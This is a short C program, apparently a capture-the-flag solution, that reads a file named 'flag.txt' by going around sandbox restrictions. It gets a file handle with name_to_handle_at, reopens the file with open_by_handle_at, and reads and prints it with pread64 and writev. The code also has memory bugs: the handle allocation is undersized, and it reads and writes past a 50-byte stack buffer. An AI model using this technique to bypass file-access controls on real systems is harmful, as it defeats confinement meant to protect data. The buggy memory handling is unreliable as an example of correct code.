#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <linux/openat2.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>


/*
int name_to_handle_at(int dirfd, const char *pathname, struct file_handle *handle, int *mount_id, int flags);
int open_by_handle_at(int mount_fd, struct file_handle *handle, int flags);
                             
struct file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[HANDLE_SIZE];
};

ssize_t pread64(int fd, void *buf, size_t count, off_t offset);

ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
*/


char *pathname = "flag.txt";
char *mount_path = "/";

int main() {
    struct file_handle *file_handle_ptr;
    struct iovec iov[1];
    char buf[50];
    int mount_id, mount_fd, dir_fd, fd, flags;
    
    file_handle_ptr = malloc(sizeof(file_handle_ptr));
    dir_fd = AT_FDCWD;
    file_handle_ptr->handle_bytes = MAX_HANDLE_SZ;
    flags = 0;

    name_to_handle_at(dir_fd, pathname, file_handle_ptr, &mount_id, flags);

    /* 
    printf("%d\n", mount_id);
    printf("%u %d   ", file_handle_ptr->handle_bytes, file_handle_ptr->handle_type);

    for (size_t j = 0; j < file_handle_ptr->handle_bytes; j++)
        printf(" %02x", file_handle_ptr->f_handle[j]);
    
    check: /proc/self/mountinfo to look for the id which matches the result returned from file_handle_ptr->mount_id
    */

    mount_fd = open(mount_path, 0);
    fd = open_by_handle_at(mount_fd, file_handle_ptr, O_RDONLY);

    if (fd == -1){
        perror("open_by_handle_at");
    }

    pread64(fd, buf, 80, 0);

    iov->iov_base = &buf;
    iov->iov_len = 100;

    writev(STDOUT_FILENO, iov, 1);

    return 0;
}
